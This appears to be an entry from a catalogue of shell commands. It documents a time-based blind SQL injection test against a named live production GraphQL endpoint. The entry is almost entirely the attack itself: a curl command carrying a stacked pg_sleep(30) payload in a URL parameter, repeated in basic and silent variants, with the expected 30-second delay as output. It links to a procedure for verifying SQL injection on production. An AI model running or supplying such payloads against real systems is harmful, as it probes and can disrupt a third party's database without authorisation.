---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
tags:
  - sqli
  - timing
type: command
output: 'Response time ~30 seconds with {} JSON'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.304Z'
id: 9eefe9de-bdbe-4d20-ac5f-b4ced4642bff
verified: false
validated: true
submitted: true
---
# time-curl-prod-30s

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Description

Measures the execution time of a curl request to the production GraphQL endpoint with a 30-second pg_sleep injection payload to verify blind SQL injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Bash builtin to time command execution | Yes |
| `curl -X POST` | HTTP POST to target | Yes |
| `https://hackerone.com/graphql` | Production endpoint | Yes |
| `embedded_submission_form_uuid=...` | 30s sleep payload (encoded) | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

### Advanced Usage

With silent output:

```bash
time curl -s -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Expected Output

real 0m30.123s
user 0m0.045s
sys 0m0.012s
{} (empty JSON)

## Related

- [[Related Procedure: Verify-SQL-Injection-on-Production]]
